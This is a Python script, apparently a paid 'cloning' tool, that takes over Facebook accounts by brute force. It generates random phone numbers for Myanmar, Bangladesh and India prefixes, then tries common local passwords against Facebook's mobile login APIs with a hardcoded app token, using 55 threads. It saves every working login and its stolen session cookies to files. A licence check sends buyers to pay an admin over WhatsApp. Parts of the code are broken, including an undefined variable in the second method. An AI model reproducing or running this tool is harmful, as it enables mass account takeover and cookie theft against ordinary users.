import os
import sys
import time
import uuid
import json
import string
import random
import requests
from requests.exceptions import ConnectionError as net_error
from concurrent.futures import ThreadPoolExecutor as speed

e = "\033[0m"
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
p = "\033[1;35m"
c = "\033[1;36m"
w = "\033[1;37m"

loop = 0
digits = []
okacc = []
cpacc = []

def logo():
    os.system("clear")
    print(banner)

def linex():
    print(f"{w}\033[1;35m==================================================")

def xxx(x):
    return f"{w}[{g}{x}{w}]"



def main():
    logo()
    print(f" {xxx('1')} Random Cloning ")
    print(f" {xxx('2')} Exit Tools ")
    linex()
    xnxx = input(f" {xxx('?')} Select : ")
    if "1" in xnxx:
        r_number()
    elif "2" in xnxx:
        main()
    elif "3" in xnxx:
        linex()
        print(f" {xxx('!')} {g}Thanks For Using Tools ")
        linex()
        sys.exit()
    else:
        linex()
        print(f" {xxx('!')} {g}Select Valid Option ")
        linex()
        time.sleep(1)
        main()

def r_number():
    logo()
    print(f" {xxx('1')} Myanmar Cloning ")
    linex()
    c = input(f" {xxx('?')} Select : ")
    if "1" in c:
        pak()
    elif "2" in c:
        bd()
    elif "3" in c:
        india()
    else:
        linex()
        print(f" {xxx('!')} {g}Select Valid Option ")
        linex()
        time.sleep(1)
        main()

def pak():
    logo()
    print(f" {xxx('•')} Example : {g}0977, 0944, 0988, 0966 ")
    linex()
    code = input(f" {xxx('?')} Enter Code : ")
    logo()
    print(f" {xxx('•')} Exampel : {g}1000, 2000, 5000, 10000 ")
    linex()
    limit = int(input(f" {xxx('?')} Enter Limit : "))
    for _ in range(limit):
        digits.append("".join(random.choices(string.digits, k=7)))
    logo()
    print(f" {xxx('1')} Method (Update Android) ")
    print(f" {xxx('2')} Method (Update Chrome) ")
    linex()
    m = input(f" {xxx('?')} Select : ")
    with speed(max_workers=55) as process:
        logo()
        total_idz = str(len(digits))
        print(f" {xxx('•')} Total Accounts  : {g}{total_idz} ")
        print(f" {xxx('•')} Code You Choose : {g}{code} ")
        print(f" {xxx('!')} {r}\033[1;33mIf No Result Turn On/Off Flight Mode ")
        linex()
        for love in digits:
            uid = code+love
            pword = [code+love,'Myanmar','kyawkyaw','KyawKyaw','nyinyi','myanmar','myanmar123','moemoe','Moe Moe','Moe123','Moe1234','Moe12345','Aung123','ayeaye','nyinyi123','Myanmar123','thuthu','kyaw123','soe123','zawzaw','zaw123','thuzar','thuzar123','kyawgyi','linlin','chitchit','waiwai','Kyaw12345','Wai12345','Min12345','Soe12345','Nyi12345','Zaw12345','Aung12345','aungaung','thaethae','thae thae','thae123','thae1234','thae12345','Thae Thae','Thae123','Thae1234','Thae1234','Thae12345']
            if "1" in m:
                process.submit(m1, uid, pword, total_idz)
            elif "2" in m:
                process.submit(m2, uid, pword, total_idz)
            else:
                process.submit(m1, uid, pword, total_idz)
    linex()
    print(f" {xxx('!')} Process Completed ")
    print(f" {xxx('•')} Total Ok Accounts : {g}{str(len(okacc))} ")
    print(f" {xxx('•')} Total Cp Accounts : {r}{str(len(cpacc))} ")
    linex()
    input(f" {xxx('!')} Press Enter To Back ")
    sys.exit()

def bd():
    logo()
    print(f" {xxx('•')} Example : {g}016, 017, 018, 019 ")
    linex()
    code = input(f" {xxx('?')} Enter Code : ")
    logo()
    print(f" {xxx('•')} Exampel : {g}1000, 2000, 5000, 10000 ")
    linex()
    limit = int(input(f" {xxx('?')} Enter Limit : "))
    for _ in range(limit):
        digits.append("".join(random.choices(string.digits, k=7)))
    logo()
    print(f" {xxx('1')} Method (B-Api) ")
    print(f" {xxx('2')} Method (B-Graph) ")
    linex()
    m = input(f" {xxx('?')} Select : ")
    with speed(max_workers=55) as process:
        logo()
        total_idz = str(len(digits))
        print(f" {xxx('•')} Total Accounts  : {g}{total_idz} ")
        print(f" {xxx('•')} Code You Choose : {g}{code} ")
        print(f" {xxx('!')} {r}If No Result Turn On/Off Flight Mode ")
        linex()
        for love in digits:
            uid = code+love
            pword = [love[1:],love,code+love,"i love you","iloveyou","bangladesh","bangladesh123","708090","102030","777000","888000","999000","123456"]
            if "1" in m:
                process.submit(m1, uid, pword, total_idz)
            elif "2" in m:
                process.submit(m2, uid, pword, total_idz)
            else:
                process.submit(m1, uid, pword, total_idz)
    linex()
    print(f" {xxx('!')} Process Completed ")
    print(f" {xxx('•')} Total Ok Accounts : {g}{str(len(okacc))} ")
    print(f" {xxx('•')} Total Cp Accounts : {r}{str(len(cpacc))} ")
    linex()
    input(f" {xxx('!')} Press Enter To Back ")
    sys.exit()

def india():
    logo()
    print(f" {xxx('•')} Example : {g}091, 092, 093, 094 ")
    linex()
    code = input(f" {xxx('?')} \033[1;37mEnter Code :\033[1;32m ")
    logo()
    print(f" {xxx('•')} Exampel : {g}1000, 2000, 5000, 10000 ")
    linex()
    limit = int(input(f" {xxx('?')} Enter Limit : "))
    for _ in range(limit):
        digits.append("".join(random.choices(string.digits, k=7)))
    logo()
    print(f" {xxx('1')} Method (Update Android) ")
    print(f" {xxx('2')} Method (Update Chrome) ")
    linex()
    m = input(f" {xxx('?')} Select : ")
    with speed(max_workers=55) as process:
        logo()
        total_idz = str(len(digits))
        print(f" {xxx('•')} Total Accounts  : {g}{total_idz} ")
        print(f" {xxx('•')} Code You Choose : {g}{code} ")
        print(f" {xxx('!')} {r}\033[1;33mIf No Result Turn On/Off Flight Mode ")
        linex()
        for love in digits:
            uid = code+love
            pword = [love,code+love,"57273200","59039200"]
            if "1" in m:
                process.submit(m1, uid, pword, total_idz)
            elif "2" in m:
                process.submit(m2, uid, pword, total_idz)
            else:
                process.submit(m1, uid, pword, total_idz)
    linex()
    print(f" {xxx('!')} Process Completed ")
    print(f" {xxx('•')} Total Ok Accounts : {g}{str(len(okacc))} ")
    print(f" {xxx('•')} Total Cp Accounts : {r}{str(len(cpacc))} ")
    linex()
    input(f" {xxx('!')} Press Enter To Back ")
    sys.exit()

def m1(uid, pword, total_idz):
    global loop
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}\033[1;36mTRK-\033[1;35mM\033[1;37m1 \033[1;32m{loop}\033[1;35m/\033[1;33m{total_idz} \033[1;32mOK\033[1;36m/\033[1;31mCP \033[1;32m{len(okacc)}/\033[1;31m{len(cpacc)}\033[1;33m\r"),
    sys.stdout.flush()
    try:
        for pw in pword:
            ua_string = "Dalvik/2.1.0 (Linux; U; Android 12; SM-F926U Build/SP1A.210812.016) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36"
            data = {
                "email": uid,
                "password": pw,
                "cpl": "true",
                "credentials_type": "password",
                "error_detail_type": "button_with_disabled",
                "source": "login",
                "format": "json",
                "generate_session_cookies": "1",
                "generate_analytics_claim": "1",
                "generate_machine_id": "1",
            }
            headers = {
                "accept-encoding": "gzip, deflate", 
                "Accept": "*/*", 
                "Connection": "keep-alive", 
                "content-type": "application/x-www-form-urlencoded", 
                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", 
                "x-fb-friendly-name": "authenticate", 
                "x-fb-http-engine": "Liger",
                "user-agent": ua_string,
            }
            url = "https://b-api.facebook.com/method/auth.login"
            result = requests.post(url, data=data, headers=headers).json()
            if "session_key" in result:
                coki = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                print(f" {g}[OK] {uid} | {pw}")
                print(f" {w}Cookies : {g}{coki}")
                open("/sdcard/TRK-M1-OK.txt", "a").write(f"{uid}|{pw}\n")
                open("/sdcard/TRK-M1-COOKIE.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                okacc.append(uid)
                break
            elif result["error_code"] == 405:
                print(f" {r}[CP] {uid} | {pw}")
                open("/sdcard/TRK-M1-CP.txt", "a").write(f"{uid}|{pw}\n")
                cpacc.append(uid)
                break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except:
        pass

def m2(uid, pword, total_idz):
    global loop
    global okacc
    global cpacc
    sys.stdout.write(f"\r {w}\033[1;36mTRK-\033[1;35mM\033[1;37m2 \033[1;32m{loop}\033[1;35m/\033[1;33m{total_idz} \033[1;32mOK\033[1;36m/\033[1;31mCP \033[1;32m{len(okacc)}/\033[1;31m{len(cpacc)}\033[1;33m\r"),
    sys.stdout.flush()
    try:
        for pw in pword:
            ua_string = "Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-N960N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36"
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "email": uid,
                "password": pw,
                "generate_analytics_claims": "1",
                "credentials_type": "password",
                "source": "login",
                "error_detail_type": "button_with_disabled",
                "enroll_misauth": "false",
                "generate_session_cookies": "1",
                "generate_machine_id": "1",
                "fb_api_req_friendly_name": "authenticate",
            }
            headers = {
                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "X-FB-Friendly-Name": "authenticate",
                "X-FB-Connection-Type": "chrome",
                "User-Agent": ua_string,
                "Accept-Encoding": "gzip, deflate",
                "Content-Type": "application/x-www-form-urlencoded",
                "X-FB-HTTP-Engine": "Liger",
            }
            url = "https://b-graph.facebook.com/auth/login"
            result = requests.post(url, data=data, headers=headers).json()
            if "session_key" in result:
                coki = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
                print(f" {g}[OK] {cid} | {pw}")
                print(f" {w}Cookies : {g}{coki}")
                open("/sdcard/TRK-M2-OK.txt", "a").write(f"{cid}|{pw}\n")
                open("/sdcard/TRK-M2-COOKIE.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                okacc.append(uid)
                break
            elif "www.facebook.com" in result["error"]["message"]:
                print(f" {r}[CP] {cid} | {pw}")
                open("/sdcard/TRK-M2--CP.txt", "a").write(f"{cid}|{pw}\n")
                cpacc.append(uid)
                break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except:
        pass




def menu_apikey():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  server = requests.get('https://github.com/zawmyoaunghk/zawmyoaunghk/blob/main/key.txt').text
  os.system(" clear")                          
  print(f" \033[1;33m  THIS TOOLS IS PAID SO YOU NEED GET APPROVED FIRST\033[1;37m\n")
  print(f"")
  print(f"\x1b[1;92m   contract Admin to Buy this Tools                                                               ");time.sleep (0.1) 
  print(f"")
  print(f"\033[1;32     YOUR  KEY : "+id)
  print(f"")
  print(f"\033[1;31m   COPY YOUR KEY AND SEND TO ADMIN  ");time.sleep(0.1)
  print(f"")
  try:
    httpCaht = requests.get("https://github.com/zawmyoaunghk/zawmyoaunghk/blob/main/key.txt").text
    if id in httpCaht:
      print("\033[1;92m   YOUR KEY APROVED   ");time.sleep(2)
      msg = str(os.geteuid())
      time.sleep(0.5)
      pass
    else:
      print(f"\x1b[1;92m    Sorry Bro Your Key not Aproved  ")
      print(f"    Send Wave or Kpay  to Admin and get aproval"); time.sleep(2)
      os.system(f'xdg-open https://wa.me/+959676429641?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
    if name == 'main':
     print(logo)
     menu_apikey()
menu_apikey()
banner = f'''\033[1;37m
                  ___           ___     Wai Linn Khaing
      ___        /  /\         /__/|    
     /  /\      /  /::\       |  |:|    
    /  /:/     /  /:/\:\      |  |:|    
   /  /:/     /  /:/~/:/    __|  |:|    
  /  /::\    /__/:/ /:/___ /__/\_|:|____
 /__/:/\:\   \  \:\/:::::/ \  \:\/:::::/
 \__\/  \:\   \  \::/~~~~   \  \::/~~~~ 
      \  \:\   \  \:\        \  \:\     
       \__\/    \  \:\        \  \:\    
                 \__\/         \__\/\033[1;35m   
{50*"-"}
    \033[1;33mTool \033[1;36mVersion \033[1;31m:     \033[1;32mGREEN_3
    \033[1;33mThanks \033[1;36mAlot  \033[1;31m:     \033[1;36mWAI \033[1;37mLINN \033[1;35mKHAING\033[1;35m
{50*"-"}'''

if __name__ == "__main__":
    main()